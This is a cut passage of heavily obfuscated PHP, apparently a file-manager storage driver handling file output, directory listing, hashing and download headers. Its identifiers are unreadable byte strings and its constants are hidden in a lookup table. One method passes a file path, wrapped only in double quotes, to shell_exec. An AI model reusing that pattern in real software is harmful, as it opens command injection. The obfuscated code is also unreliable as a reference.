IO::fileOutServer($¾½ÊÉ‡£[$ş€¬’ö’[86]], $ãï¯øßè, $¿óóÙÂó, $ß¿ó¨¶æ); } IO::fileOut($¾½ÊÉ‡£[$ş€¬’ö’[86]], $ãï¯øßè, $¿óóÙÂó, $ß¿ó¨¶æ); } public function fileOut($¬Àİ½…à, $ªìôº­û = false, $Í›òÎ¥· = false, $±Ë™ş„½ = '') { $this->_fileOut($¬Àİ½…à, $ªìôº­û, $Í›òÎ¥·, $±Ë™ş„½); } public function fileOutServer($ÃÄÛ¾…, $ÀĞÕÍ¸ = false, $ÀùŠÆ = false, $ŠÄ‡üñ¶ = '') { $this->_fileOut($ÃÄÛ¾…, $ÀĞÕÍ¸, $ÀùŠÆ, $ŠÄ‡üñ¶, !0); } protected function _fileOutImage($¢ÊÙàö, $úÏ¿Ğœ× = 250) { $š¾´ŞÁ° =& $_SERVER[•Ùç É]; $åÖÍòá = $this->model->pathInfo($¢ÊÙàö); if ($åÖÍòá[$š¾´ŞÁ°[455]] == $š¾´ŞÁ°[90]) { show_json($š¾´ŞÁ°[1389] . $¢ÊÙàö, !1); } $£ºÄÆ†Î = $this->model->fileInfoGet($¢ÊÙàö); $åÖÍòá[$š¾´ŞÁ°[172]] = $£ºÄÆ†Î[$š¾´ŞÁ°[86]]; $GLOBALS[$š¾´ŞÁ°[171]] = $åÖÍòá; IO::fileOutImage($£ºÄÆ†Î[$š¾´ŞÁ°[86]], $úÏ¿Ğœ×); } public function fileOutImage($Çã¡Ø, $í”Œó‘Ÿ = 250) { $this->_fileOutImage($Çã¡Ø, $í”Œó‘Ÿ); } public function fileOutImageServer($œ¬åİì, $ğï²ŸŸ® = 250) { $this->_fileOutImage($œ¬åİì, $ğï²ŸŸ®); } public function link($ÒÈïôı£, $í²˜½‡¤ = '') { $Ô·ÉÜ  = $this->model->fileInfoGet($ÒÈïôı£); return IO::link($Ô·ÉÜ [$_SERVER[•Ùç É][86]], $í²˜½‡¤); } protected function parse($Ö‰•Ÿ¢ú) { $«çíÆ¤¡ =& $_SERVER[•Ùç É]; if (strstr($Ö‰•Ÿ¢ú, $«çíÆ¤¡[8]) === !1) { return array($«çíÆ¤¡[463] => intval($Ö‰•Ÿ¢ú), $«çíÆ¤¡[86] => $«çíÆ¤¡[12], $«çíÆ¤¡[1385] => array()); } $şĞÃŞ§‘ = explode($«çíÆ¤¡[8], trim($Ö‰•Ÿ¢ú, $«çíÆ¤¡[8])); if (count($şĞÃŞ§‘) < 2) { show_tips(clear_html($Ö‰•Ÿ¢ú) . $«çíÆ¤¡[1390]); } return array($«çíÆ¤¡[463] => intval($şĞÃŞ§‘[0]), $«çíÆ¤¡[86] => $şĞÃŞ§‘[1], $«çíÆ¤¡[1385] => array_slice($şĞÃŞ§‘, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($Ìõşù€š) { $this->pathParse = $Ìõşù€š; $this->model = Model($_SERVER[•Ùç É][1384]); } public function getPathOuter($×èñÏ„‰) { $¼ûĞá× =& $_SERVER[•Ùç É]; if (!$×èñÏ„‰) { return $×èñÏ„‰; } $½ë¿©íİ = $this->parse($×èñÏ„‰); return trim(KodIO::makeShare($this->pathParse[$¼ûĞá×[445]], $½ë¿©íİ[$¼ûĞá×[445]]), $¼ûĞá×[8]); } protected function infoParse($Û‰Ê »‡, $øîË³«â = false, $µˆ‰¸£ = false) { $ŒœÀêŞò =& $_SERVER[•Ùç É]; $¿ÎÉ¥¸Ö = $this->pathParse[$ŒœÀêŞò[445]]; $ÛäŠ¡¯î = trim($this->pathParse[$ŒœÀêŞò[1219]], $ŒœÀêŞò[8]); return Action($ŒœÀêŞò[1391])->sharePathInfo($¿ÎÉ¥¸Ö, $ÛäŠ¡¯î, $øîË³«â); } public function infoFull($Û™Ñ) { $êß¼ğ‚Ú =& $_SERVER[•Ùç É]; $¥öÆ¡€Ş = explode($êß¼ğ‚Ú[8], trim($Û™Ñ, $êß¼ğ‚Ú[8])); if (count($¥öÆ¡€Ş) > 1) { $äàö¤³ø = implode($êß¼ğ‚Ú[8], array_splice($¥öÆ¡€Ş, 1)); $£ÀŸÓƒ³ = $this->model->pathInfoByPath($¥öÆ¡€Ş[0], $äàö¤³ø); if (!$£ÀŸÓƒ³) { return !1; } $this->pathParse[$êß¼ğ‚Ú[1219]] = $£ÀŸÓƒ³[$êß¼ğ‚Ú[183]]; } return $this->infoParse($Û™Ñ); } public function listAll($ á‡öË) { $ÑÑËŸ Ö =& $_SERVER[•Ùç É]; $—»İ¸ = IO::info($this->pathParse[$ÑÑËŸ Ö[86]]); if (!$—»İ¸) { return array(); } $ØÓÕüÂÑ = $this->model->listAll($ á‡öË); $ŞÚÀò»Ä = Model($ÑÑËŸ Ö[634])->getInfo($—»İ¸[$ÑÑËŸ Ö[635]]); foreach ($ØÓÕüÂÑ as &$Š·ôæĞµ) { check_abort(); $Š·ôæĞµ[$ÑÑËŸ Ö[89]] = Action($ÑÑËŸ Ö[1391])->_shareItemeParse($Š·ôæĞµ[$ÑÑËŸ Ö[89]], $ŞÚÀò»Ä); } unset($Š·ôæĞµ); return $ØÓÕüÂÑ; } } goto Dˆ³„ëÁââ; F²Ë—å–‘¾: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $¢¥Õ·´µ =& $_SERVER[•Ùç É]; $this->objectDriver = array($¢¥Õ·´µ[60], $¢¥Õ·´µ[61], $¢¥Õ·´µ[62], $¢¥Õ·´µ[63], $¢¥Õ·´µ[64], $¢¥Õ·´µ[65], $¢¥Õ·´µ[66], $¢¥Õ·´µ[67], $¢¥Õ·´µ[68], $¢¥Õ·´µ[69], $¢¥Õ·´µ[70]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($ˆÍ»Ä¹ì) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($ˆÍ»Ä¹ì, $_SERVER[•Ùç É][8]); } return $ˆÍ»Ä¹ì; } public function iconvApp($ß•İ¹“™) { return $ß•İ¹“™; } public function iconvSystem($İ¼ï®ÅÚ) { return $İ¼ï®ÅÚ; } public function iconvTo($é£Ìùúã, $¡¬›Âö–, $¨Í±Óğ¬) { $ëï‡õÈ© =& $_SERVER[•Ùç É]; if (!$é£Ìùúã || !function_exists($ëï‡õÈ©[71])) { return $é£Ìùúã; } static $ƒ»å’« = array(); $•äÛ‘ŒÈ = $¡¬›Âö– . $ëï‡õÈ©[72] . $¨Í±Óğ¬ . $ëï‡õÈ©[73] . $é£Ìùúã; if (isset($ƒ»å’«[$•äÛ‘ŒÈ])) { return $ƒ»å’«[$•äÛ‘ŒÈ]; } if (function_exists($ëï‡õÈ©[74])) { $Ìşª¾è· = @mb_convert_encoding($é£Ìùúã, $¨Í±Óğ¬, $¡¬›Âö–); } else { $Ìşª¾è· = @iconv($¡¬›Âö–, $¨Í±Óğ¬, $é£Ìùúã); } $Ìşª¾è· = $Ìşª¾è· ? $Ìşª¾è· : $é£Ìùúã; if (strstr($Ìşª¾è·, $ëï‡õÈ©[75])) { $Ìşª¾è· = str_replace($ëï‡õÈ©[75], $ëï‡õÈ©[11], $Ìşª¾è·); } $ƒ»å’«[$¡¬›Âö– . $ëï‡õÈ©[72] . $¨Í±Óğ¬ . $ëï‡õÈ©[73] . $é£Ìùúã] = $Ìşª¾è·; $ƒ»å’«[$¨Í±Óğ¬ . $ëï‡õÈ©[72] . $¡¬›Âö– . $ëï‡õÈ©[73] . $é£Ìùúã] = $é£Ìùúã; $ƒ»å’«[$¨Í±Óğ¬ . $ëï‡õÈ©[72] . $¡¬›Âö– . $ëï‡õÈ©[73] . $Ìşª¾è·] = $é£Ìùúã; $ƒ»å’«[$¡¬›Âö– . $ëï‡õÈ©[72] . $¨Í±Óğ¬ . $ëï‡õÈ©[73] . $Ìşª¾è·] = $Ìşª¾è·; return $Ìşª¾è·; } public function getPathInner($Ş’Ôß’Ä) { $úÏ¡İÆ† = IO::init($Ş’Ôß’Ä); return $úÏ¡İÆ†->path; } public function getPathOuter($ªçÖŞª) { $„ËüÏ³ =& $_SERVER[•Ùç É]; $ÉÛÜóš³ = strlen(trim($this->pathBase, $„ËüÏ³[8])); $ªçÖŞª = substr(trim($ªçÖŞª, $„ËüÏ³[8]), $ÉÛÜóš³); return $this->pathDriver . $„ËüÏ³[8] . ltrim($ªçÖŞª, $„ËüÏ³[8]); } public function isParentOf($à¢ÏøÔØ, $¢¾ÜºÃ’) { $¿„ˆÎ¨Ÿ =& $_SERVER[•Ùç É]; $à¢ÏøÔØ = rtrim(strtolower($à¢ÏøÔØ), $¿„ˆÎ¨Ÿ[8]) . $¿„ˆÎ¨Ÿ[8]; $¢¾ÜºÃ’ = rtrim(strtolower($¢¾ÜºÃ’), $¿„ˆÎ¨Ÿ[8]) . $¿„ˆÎ¨Ÿ[8]; $à³³ã–â = strpos($¢¾ÜºÃ’, $à¢ÏøÔØ) === 0; return $à³³ã–â; } public function getType() { $ÜĞ²°§½ =& $_SERVER[•Ùç É]; $›ş°èÇº = str_replace($ÜĞ²°§½[76], $ÜĞ²°§½[12], get_class($this)); return strtolower($›ş°èÇº); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($Çè™çˆç, $ú¶ßÆØÍ) { $»¡³ò– =& $_SERVER[•Ùç É]; $ñÇ²ˆ§Ş = rtrim($Çè™çˆç, $»¡³ò–[8]) . $»¡³ò–[8] . $ú¶ßÆØÍ; $„šò»½š = $this->exist($ñÇ²ˆ§Ş); return $„šò»½š ? $ñÇ²ˆ§Ş : !1; } public function setModifyTime($Èš§¹‰Î, $²ª¼æš· = '') { } public function renameObject($©À©’¯‘, $™”óÛûõ) { $î»—Ó = $™”óÛûõ; $©À©’¯‘ = $this->getPathOuter($©À©’¯‘); $™”óÛûõ = $this->pathFather($©À©’¯‘) . $™”óÛûõ; $ÄÃäôšÜ = IO::copy($©À©’¯‘, $this->pathFather($©À©’¯‘), REPEAT_RENAME_FOLDER, $î»—Ó); if ($ÄÃäôšÜ) { IO::remove($©À©’¯‘); } return $ÄÃäôšÜ ? $™”óÛûõ : !1; } public function tempFile($èàšüä° = '', $µåå§š = '') { if (!$èàšüä°) { $èàšüä° = rand_string(15); } $¬×òš§Ş = TEMP_FILES . rand_string(15) . $_SERVER[•Ùç É][8]; @mkdir($¬×òš§Ş, DEFAULT_PERRMISSIONS, !0); $Ì½Ò¾² = $¬×òš§Ş . $èàšüä°; @touch($Ì½Ò¾²); if ($µåå§š) { file_put_contents($Ì½Ò¾², $µåå§š); } return $Ì½Ò¾²; } public function tempFileRemve($˜è» °ù) { @unlink($˜è» °ù); @rmdir($this->pathFather($˜è» °ù)); } public function mkfile($ÙÀÊÓª, $Ëë¹Â€Ò = '', $×çŞùı = REPEAT_RENAME) { } public function mkdir($¯ÀåÅØ™, $ÉÊ·Ú„¢ = REPEAT_SKIP) { } public function delFile($–ü¤­€”) { } public function delFolder($ÒÃöşŞ) { } public function copyFile($øÎÃÊÙô, $×œ”ú­Î) { } public function moveFile($»¬à÷†û, $»Ûªó›ş) { } public function remove($ş¥¤‹ü) { if ($this->isFile($ş¥¤‹ü)) { return $this->delFile($ş¥¤‹ü); } return $this->delFolder($ş¥¤‹ü); } public function rename($ñ¯êÀ¦ö, $¶Ì‰ïÜ‚) { } public function exist($Ê‹…¤Á„) { } public function findByHash($„ ÌŒ± = '', $´ªÙìÖ· = '') { return !1; } public function isFile($˜êçŠ†Ö) { } public function isFolder($ô§‘é¾È) { } public function size($Ñ„çŞîÏ) { } public function info($Ÿ½¢èÚ) { } public function infoSimple($°ãèß¥‡) { return $this->info($°ãèß¥‡); } public function infoAuth($¤á¨æô») { return $this->info($¤á¨æô»); } public function infoFull($’ãçç­ì) { return $this->info($’ãçç­ì); } public function infoFullSimple($âôÚÎÕá) { return $this->info($âôÚÎÕá); } public function infoWithChildren($ŞÅÏüì«) { $öƒÂÏÚ€ =& $_SERVER[•Ùç É]; static $š†à§é¦ = array(); if (isset($š†à§é¦[$ŞÅÏüì«])) { return $š†à§é¦[$ŞÅÏüì«]; } $ºµ¸Áè† = $this->info($ŞÅÏüì«); if ($ºµ¸Áè† && $ºµ¸Áè†[$öƒÂÏÚ€[33]] == $öƒÂÏÚ€[77]) { $×É‘–Ì¼ = array($öƒÂÏÚ€[78] => 0, $öƒÂÏÚ€[79] => 0, $öƒÂÏÚ€[80] => 0); $this->infoChildren($ŞÅÏüì«, $×É‘–Ì¼); $ºµ¸Áè†[$öƒÂÏÚ€[78]] = $×É‘–Ì¼[$öƒÂÏÚ€[78]]; $ºµ¸Áè†[$öƒÂÏÚ€[81]] = array($öƒÂÏÚ€[82] => $×É‘–Ì¼[$öƒÂÏÚ€[79]], $öƒÂÏÚ€[83] => $×É‘–Ì¼[$öƒÂÏÚ€[80]]); $š†à§é¦[$ŞÅÏüì«] = $ºµ¸Áè†; } return $ºµ¸Áè†; } public function listPath($‘ÀÎÅ²“, $·÷©Ôè = false) { } public function has($²œ½àĞš, $…ÄÅŠ˜€ = false, $ú¢ó–£ = false) { } public function canRead($’Øª˜û¨) { } public function canWrite($®—¿Ñªà) { } public function getContent($é„¯Üãğ) { } public function setContent($îşÍ¡¥ä, $ÚÎÌòéÕ = '') { } protected function infoChildren($—ï·€«Æ, &$×« €é÷) { $ì¾¼Í¥Ù =& $_SERVER[•Ùç É]; check_abort_echo(); $·•äŠ¨  = $this->listPath($—ï·€«Æ, !0); $·•äŠ¨  = array_merge($·•äŠ¨ [$ì¾¼Í¥Ù[84]], $·•äŠ¨ [$ì¾¼Í¥Ù[85]]); foreach ($·•äŠ¨  as $’€…‘Œõ) { if ($’€…‘Œõ[$ì¾¼Í¥Ù[33]] == $ì¾¼Í¥Ù[77]) { $×« €é÷[$ì¾¼Í¥Ù[80]]++; $÷¤¯öõÜ = $this->getPathInner($’€…‘Œõ[$ì¾¼Í¥Ù[86]]); $this->infoChildren($÷¤¯öõÜ, $×« €é÷); } else { $×« €é÷[$ì¾¼Í¥Ù[79]]++; $×« €é÷[$ì¾¼Í¥Ù[78]] += $’€…‘Œõ[$ì¾¼Í¥Ù[78]]; } } } public function fileSubstr($äóµÓ•ı, $Ì×‡åïï, $ß„„Éê•) { } public function listAll($õàëÃö) { } public function listAllMake($ı¯»ëÀ, &$±åãõ¢) { $…’ÎéÍ  =& $_SERVER[•Ùç É]; check_abort_echo(); $š€ºïæ¡ = $this->listPath($ı¯»ëÀ, !0); if (!$š€ºïæ¡) { return; } $ŠÉº¬¡Û = array_merge($š€ºïæ¡[$…’ÎéÍ [84]], $š€ºïæ¡[$…’ÎéÍ [85]]); foreach ($ŠÉº¬¡Û as $ÂÔ©¡ı) { $ÆšÒÇ¨ = $ÂÔ©¡ı[$…’ÎéÍ [33]] == $…’ÎéÍ [77]; $ßæ„ˆó = array($…’ÎéÍ [86] => $ÂÔ©¡ı[$…’ÎéÍ [86]], $…’ÎéÍ [77] => $ÆšÒÇ¨); if (isset($ÂÔ©¡ı[$…’ÎéÍ [78]])) { $ßæ„ˆó[$…’ÎéÍ [78]] = $ÂÔ©¡ı[$…’ÎéÍ [78]]; } if (isset($ÂÔ©¡ı[$…’ÎéÍ [87]])) { $ßæ„ˆó[$…’ÎéÍ [87]] = $ÂÔ©¡ı[$…’ÎéÍ [87]]; } if (!$ÆšÒÇ¨) { $±åãõ¢[] = $ßæ„ˆó; continue; } $±åãõ¢[] = $ßæ„ˆó; $èòÚó— = $ÂÔ©¡ı[$…’ÎéÍ [86]]; $æõï³âõ = $this->pathDriver; if (substr($ÂÔ©¡ı[$…’ÎéÍ [86]], 0, strlen($æõï³âõ)) == $æõï³âõ) { $èòÚó— = substr($èòÚó—, strlen($æõï³âõ)); } $this->listAllMake($èòÚó—, $±åãõ¢); } } public function listAllSimple($«ë°ìéÑ, $çó‚Š–Ì = false) { $ßÛ†²¿Î = $this->listAll($«ë°ìéÑ); return $this->listAllSimpleMake($ßÛ†²¿Î, $this->getPathOuter($«ë°ìéÑ), $çó‚Š–Ì); } public function listAllSimpleMake($Ä”ºÍ¡¼, $ˆ¼®Äİó, $«—’î­´) { $©è‰ïÎ· =& $_SERVER[•Ùç É]; $¯å´‚•í = array(); $ˆ¼®Äİó = rtrim(get_path_father($ˆ¼®Äİó), $©è‰ïÎ·[8]) . $©è‰ïÎ·[8]; foreach ($Ä”ºÍ¡¼ as $æÓùğ™) { $·÷¯±œñ = array($©è‰ïÎ·[86] => $æÓùğ™[$©è‰ïÎ·[86]], $©è‰ïÎ·[88] => $æÓùğ™[$©è‰ïÎ·[86]], $©è‰ïÎ·[77] => $æÓùğ™[$©è‰ïÎ·[77]]); if (isset($æÓùğ™[$©è‰ïÎ·[78]]) && !$æÓùğ™[$©è‰ïÎ·[77]]) { $·÷¯±œñ[$©è‰ïÎ·[78]] = $æÓùğ™[$©è‰ïÎ·[78]]; } if (isset($æÓùğ™[$©è‰ïÎ·[87]])) { $·÷¯±œñ[$©è‰ïÎ·[87]] = $æÓùğ™[$©è‰ïÎ·[87]]; } if (is_array($æÓùğ™[$©è‰ïÎ·[89]])) { $·÷¯±œñ[$©è‰ïÎ·[88]] = $æÓùğ™[$©è‰ïÎ·[89]][$©è‰ïÎ·[86]]; $·÷¯±œñ[$©è‰ïÎ·[78]] = $æÓùğ™[$©è‰ïÎ·[89]][$©è‰ïÎ·[78]]; $·÷¯±œñ[$©è‰ïÎ·[87]] = $æÓùğ™[$©è‰ïÎ·[89]][$©è‰ïÎ·[87]]; } else { if (substr($æÓùğ™[$©è‰ïÎ·[86]], 0, strlen($ˆ¼®Äİó)) == $ˆ¼®Äİó) { $·÷¯±œñ[$©è‰ïÎ·[86]] = substr($æÓùğ™[$©è‰ïÎ·[86]], strlen($ˆ¼®Äİó)); } } $›şÙ‰Ï = $æÓùğ™[$©è‰ïÎ·[77]] ? $©è‰ïÎ·[8] : $©è‰ïÎ·[12]; $·÷¯±œñ[$©è‰ïÎ·[88]] = rtrim($·÷¯±œñ[$©è‰ïÎ·[88]], $©è‰ïÎ·[8]) . $›şÙ‰Ï; $·÷¯±œñ[$©è‰ïÎ·[86]] = $©è‰ïÎ·[8] . trim($·÷¯±œñ[$©è‰ïÎ·[86]], $©è‰ïÎ·[8]) . $›şÙ‰Ï; if (!$«—’î­´) { $ãíµë¾¥ = explode($©è‰ïÎ·[8], trim($·÷¯±œñ[$©è‰ïÎ·[86]], $©è‰ïÎ·[8])); $·÷¯±œñ[$©è‰ïÎ·[86]] = $©è‰ïÎ·[8] . implode($©è‰ïÎ·[8], array_slice($ãíµë¾¥, 1)) . $›şÙ‰Ï; } $¯å´‚•í[] = $·÷¯±œñ; } return array_sort_by($¯å´‚•í, $©è‰ïÎ·[86]); } public function upload($Ä‰³Á”„, $«µ´œ³Œ, $Ñå¿İÚÂ = false, $ì©¤ÄÚ’ = REPEAT_REPLACE) { } public function uploadFileByID($ş‘åœŠÇ, $“¬ıÑëÔ, $òºŠ¡Ší) { } public function uploadFileByPath($Ü×Í¶Î, $¨×Õ…Ş, $ú‚ªˆı = array()) { } public function isUploadServer() { $ÛÂ²òÀà =& $_SERVER[•Ùç É]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $ÛÂ²òÀà[90]) { return !0; } return $GLOBALS[$ÛÂ²òÀà[6]][$ÛÂ²òÀà[91]][$ÛÂ²òÀà[92]]; } public function isFileOutServer() { $›í™ˆáÛ =& $_SERVER[•Ùç É]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $›í™ˆáÛ[90]) { return !0; } return $GLOBALS[$›í™ˆáÛ[6]][$›í™ˆáÛ[91]][$›í™ˆáÛ[93]]; } public function isCdnHost() { if ($this->isFileOutServer() || empty($this->cdnHost)) { return !1; } return request_url_safe($this->cdnHost) ? !0 : !1; } public function getCdnLink($îğ­ûøõ) { $…÷ÎÏş¨ =& $_SERVER[•Ùç É]; if (!$this->isCdnHost()) { return $îğ­ûøõ; } return str_replace(trim(get_url_root($îğ­ûøõ), $…÷ÎÏş¨[8]), trim($this->cdnHost, $…÷ÎÏş¨[8]), $îğ­ûøõ); } public function uploadLink($º†±èº, $“¤¦â¾ = 0) { $ÀöÇ¨¿Ä =& $_SERVER[•Ùç É]; if ($this->isUploadServer()) { return; } $İ„ÑûÇç = $this->getType(); if (!in_array($İ„ÑûÇç, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $â¹ˆ°²® = 1024 * 1024 * 10; $Ô®Û  = $“¤¦â¾ <= $â¹ˆ°²® ? $ÀöÇ¨¿Ä[94] : $ÀöÇ¨¿Ä[95]; $ó¿â¹ìˆ = (!$“¤¦â¾ ? 1 : ceil($“¤¦â¾ / pow(1024, 3))) * 3600 * 4; $‘îö·² = $this->{$Ô®Û }($º†±èº, $ó¿â¹ìˆ); if ($‘îö·²) { $‘îö·²[$ÀöÇ¨¿Ä[96]] = $º†±èº; $‘îö·²[$ÀöÇ¨¿Ä[97]] = $İ„ÑûÇç; } return $‘îö·²; } public function uploadFormData($Ûá›¤şñ, $ÑÎ†êÙ¸ = 3600) { } public function multiUploadFormData($ÓÒ‚¡õÚ, $é˜ó¾… = 3600) { } public function download($°ÛØÉ¢¾, $¯’·†ˆ) { } public function ext($çÏáÃôã) { $€Ã´Ëşâ =& $_SERVER[•Ùç É]; if (strpos($çÏáÃôã, $€Ã´Ëşâ[8]) === -1) { $õ¶ªµÌ = $çÏáÃôã; } else { $õ¶ªµÌ = $this->pathThis($çÏáÃôã); } $‚ïË£Êè = $€Ã´Ëşâ[12]; if (strstr($õ¶ªµÌ, $€Ã´Ëşâ[10])) { $‚ïË£Êè = substr($õ¶ªµÌ, strrpos($õ¶ªµÌ, $€Ã´Ëşâ[10]) + 1); $‚ïË£Êè = strtolower($‚ïË£Êè); } if (strlen($‚ïË£Êè) > 3 && preg_match($€Ã´Ëşâ[98], $‚ïË£Êè, $ÖÛÛØŸó)) { $‚ïË£Êè = $€Ã´Ëşâ[12]; } return $‚ïË£Êè; } public function pathThis($­«åû†ø) { $Êï°É›Ì =& $_SERVER[•Ùç É]; $­«åû†ø = str_replace($Êï°É›Ì[99], $Êï°É›Ì[8], rtrim($­«åû†ø, $Êï°É›Ì[8])); $éÅ‹êøÙ = strrpos($­«åû†ø, $Êï°É›Ì[8]); if ($éÅ‹êøÙ === !1) { return $­«åû†ø; } return substr($­«åû†ø, $éÅ‹êøÙ + 1); } public function pathFather($âºŞş²ı) { $©ìîóÓ =& $_SERVER[•Ùç É]; $âºŞş²ı = str_replace($©ìîóÓ[99], $©ìîóÓ[8], rtrim($âºŞş²ı, $©ìîóÓ[8])); $¼Ï¡ÄÈ¡ = strrpos($âºŞş²ı, $©ìîóÓ[8]); if ($¼Ï¡ÄÈ¡ === !1) { return $©ìîóÓ[12]; } return substr($âºŞş²ı, 0, $¼Ï¡ÄÈ¡ + 1); } public function hashSimple($©ˆóç) { $†ÓŸ€¥­ =& $_SERVER[•Ùç É]; if (!$©ˆóç) { return md5($†ÓŸ€¥­[12]); } $§Í¯×Á = $this->size($©ˆóç); $Ûüñƒ÷Œ = 200; $ß¥úŞ¯É = 50; if ($§Í¯×Á <= $Ûüñƒ÷Œ * $ß¥úŞ¯É) { return $this->hashMd5($©ˆóç) . $§Í¯×Á; } $¯™®ÖÙ• = intval($§Í¯×Á / $ß¥úŞ¯É); $–Ôœà¾ü = $†ÓŸ€¥­[12]; for ($ÄÏ´ÉöŸ = 0; $ÄÏ´ÉöŸ < $ß¥úŞ¯É; $ÄÏ´ÉöŸ++) { $–Ôœà¾ü .= $this->fileSubstr($©ˆóç, $¯™®ÖÙ• * $ÄÏ´ÉöŸ, $Ûüñƒ÷Œ); } $–Ôœà¾ü .= $this->fileSubstr($©ˆóç, $§Í¯×Á - $Ûüñƒ÷Œ, $Ûüñƒ÷Œ); return md5($–Ôœà¾ü) . $§Í¯×Á; } public static $md5Cache = array(); public function hashMd5($ü«Ì€Ø) { if (!$ü«Ì€Ø) { return md5($_SERVER[•Ùç É][12]); } $ü«Ì€Ø = $this->iconvSystem($ü«Ì€Ø); if (isset(self::$md5Cache[$ü«Ì€Ø])) { return self::$md5Cache[$ü«Ì€Ø]; } self::$md5Cache[$ü«Ì€Ø] = $this->hashMd5Shell($ü«Ì€Ø); if (!self::$md5Cache[$ü«Ì€Ø]) { self::$md5Cache[$ü«Ì€Ø] = @md5_file($ü«Ì€Ø); } return self::$md5Cache[$ü«Ì€Ø]; } private function hashMd5Shell($ÊÓ¬ÃÅ) { $ášİÔÊâ =& $_SERVER[•Ùç É]; if (!$ÊÓ¬ÃÅ) { return md5($ášİÔÊâ[12]); } if (!function_exists($ášİÔÊâ[100])) { return !1; } $İÅŸ²çü = array($ášİÔÊâ[101], $ášİÔÊâ[102]); $æ¥ä Şì = Cache::get($ášİÔÊâ[103]); if (!$æ¥ä Şì) { $—³Ã±€´ = BASIC_PATH . $ášİÔÊâ[104]; $ÒÙü¦İ™ = md5_file($—³Ã±€´); $æ¥ä Şì = $ášİÔÊâ[105]; foreach ($İÅŸ²çü as $Œ´¯¶²“) { $ØÑ‡—Ÿ = shell_exec($Œ´¯¶²“ . "\x20\x22{$—³Ã±€´}\x22"); if ($ØÑ‡—Ÿ && substr(trim($ØÑ‡—Ÿ), 0, 32) == $ÒÙü¦İ™) { $æ¥ä Şì = $Œ´¯¶²“; break; } } Cache::set($ášİÔÊâ[103], $æ¥ä Şì, 3600); } if ($æ¥ä Şì == $ášİÔÊâ[105]) { return !1; } $ØÑ‡—Ÿ = shell_exec($æ¥ä Şì . "\x20\42{$ÊÓ¬ÃÅ}\42"); $ØÑ‡—Ÿ = str_replace($ášİÔÊâ[106], $ášİÔÊâ[12], $ØÑ‡—Ÿ); return substr($ØÑ‡—Ÿ, 0, 32); } public function link($ˆËøè½²) { return $ˆËøè½²; } public function fileOut($ˆ±¡Üı¾, $Ü–Ñµãõ = false, $¢„ƒüË´ = false, $Ó¤ÅŠàŸ = '') { $Ûù²çŸ· =& $_SERVER[•Ùç É]; $this->cacheMethod(null, null); if (!$ˆ±¡Üı¾ || !$this->exist($ˆ±¡Üı¾)) { show_json(LNG($Ûù²çŸ·[107]), !1, $¢„ƒüË´); } $÷èßµì = $this->getType() == $Ûù²çŸ·[108]; $¿½©°š = $GLOBALS[$Ûù²çŸ·[6]][$Ûù²çŸ·[91]][$Ûù²çŸ·[109]][$Ûù²çŸ·[110]]; $•ú’î¼‹ = (double) $GLOBALS[$Ûù²çŸ·[6]][$Ûù²çŸ·[91]][$Ûù²çŸ·[109]][$Ûù²çŸ·[111]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $—åº²Ğ÷ = $this->infoFull($ˆ±¡Üı¾); $€èçÒıº = $—åº²Ğ÷[$Ûù²çŸ·[78]]; $ò«­Â²ˆ = gmdate($Ûù²çŸ·[112], $—åº²Ğ÷[$Ûù²çŸ·[87]]); $¥µú¶ = $¢„ƒüË´ ? $¢„ƒüË´ : $this->iconvApp($—åº²Ğ÷[$Ûù²çŸ·[32]]); $Í«Í„ø½ = 0; $†·ßîŠ = $€èçÒıº - 1; $ºï¾•İ” = $this->ext($¥µú¶); if (in_array($ºï¾•İ”, array($Ûù²çŸ·[113], $Ûù²çŸ·[114], $Ûù²çŸ·[115], $Ûù²çŸ·[116]))) { $ºï¾•İ” = $Ûù²çŸ·[117]; } if (in_array($ºï¾•İ”, array($Ûù²çŸ·[118]))) { $ºï¾•İ” = $Ûù²çŸ·[119]; } if (!$Ó¤ÅŠàŸ) { $Ó¤ÅŠàŸ = md5($ò«­Â²ˆ . $€èçÒıº); } $Ó¤ÅŠàŸ = $Ûù²çŸ·[120] . $Ó¤ÅŠàŸ . $Ûù²çŸ·[120]; $İòÕˆå³ = get_file_mime($ºï¾•İ”); $´»ö² ¥ = !0; $´»ö² ¥ = isset($_GET[$Ûù²çŸ·[121]]) ? !1 : !0; if ($Ü–Ñµãõ === !1 && !mime_support($İòÕˆå³)) { $İòÕˆå³ = $Ûù²çŸ·[122]; } header($Ûù²çŸ·[123]); header($Ûù²çŸ·[124] . $İòÕˆå³); $ôü¿‡Ñ‚ = rawurlencode($¥µú¶); $ôü¿‡Ñ‚ = $Ûù²çŸ·[120] . $ôü¿‡Ñ‚ . $Ûù²çŸ·[125] . $ôü¿‡Ñ‚; if ($Ü–Ñµãõ) { header($Ûù²çŸ·[126]); header($Ûù²çŸ·[127] . $ôü¿‡Ñ‚); } else { if ($´»ö² ¥) { header($Ûù²çŸ·[128] . $ôü¿‡Ñ‚); } } header($Ûù²çŸ·[129] . gmdate($Ûù²çŸ·[112], time() + 3600 * 24 * 30) . $Ûù²çŸ·[130]); header($Ûù²çŸ·[131]); header($Ûù²çŸ·[132]); header($Ûù²çŸ·[133]); if (isset($_SERVER[$Ûù²çŸ·[134]]) && strtotime($_SERVER[$Ûù²çŸ·[134]]) == $—åº²Ğ÷[$Ûù²çŸ·[87]]) { header($Ûù²çŸ·[135], !0, 304); die; } if (isset($_SERVER[$Ûù²çŸ·[136]]) && $_SERVER[$Ûù²çŸ·[136]] == $Ó¤ÅŠàŸ) { header($Ûù²çŸ·[137] . $Ó¤ÅŠàŸ, !0, 304); die; } header($Ûù²çŸ·[137] . $Ó¤ÅŠàŸ); header($Ûù²çŸ·[138] . $ò«­Â²ˆ . $Ûù²çŸ·[130]); header($Ûù²çŸ·[139] . $¥µú¶); header($Ûù²çŸ·[140]); header($Ûù²çŸ·[141] . $€èçÒıº); header($Ûù²çŸ·[142]); Hook::trigger($Ûù²çŸ·[143], $ˆ±¡Üı¾, $€èçÒıº, $¥µú¶, $ºï¾•İ”); if (!$Ü–Ñµãõ && $ºï¾•İ” == 